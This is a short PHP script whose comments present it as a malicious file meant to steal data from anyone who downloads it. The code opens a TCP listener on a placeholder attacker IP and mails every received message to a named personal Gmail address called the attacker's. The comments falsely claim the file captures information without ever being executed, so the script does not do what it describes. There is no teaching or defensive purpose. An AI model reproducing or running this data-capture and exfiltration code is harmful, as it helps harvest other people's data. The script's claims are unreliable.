// Lets make a malicious file that will send all the information of anyone who will download this file without the need of it running on server, and without the need of it being executed on the client side, this file will be a simple PHP script that will listen for incoming connections and print the data received from the client, this way we can easily capture any information sent by the client without the need of it being executed on the server or client side.

// The code is following:
// Lets redo the code so that it mails the data to the attacker instead of printing it on the console, this way we can easily capture any information sent by the client without the need of it being executed on the server or client side, and also we can easily access the captured data from anywhere without the need of being on the same network as the victim.
<?php
$host = '192.168.1.36'; // Change to attacker's IP
$port = 80; // Change to desired port
// Create a TCP Stream socket
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
// Bind the socket to an address/port
socket_bind($sock, $host, $port) or die('Could not bind to address');
// Start listening for connections
socket_listen($sock, 5) or die('Could not listen on socket');
echo "Waiting for connections...\n";
while (true) {
    // Accept incoming connection
    $client = socket_accept($sock) or die('Could not accept connection');
    echo "Client connected!\n";
    // Read data from the client
    $data = socket_read($client, 1024) or die('Could not read from client');
    echo "Received data: $data\n";
    // Send the data to the attacker's email
    mail('chaudharysanyam987@gmail.com', 'Captured Data', $data);
    // Close the client socket
    socket_close($client);
}
// Close the server socket
socket_close($sock);
?>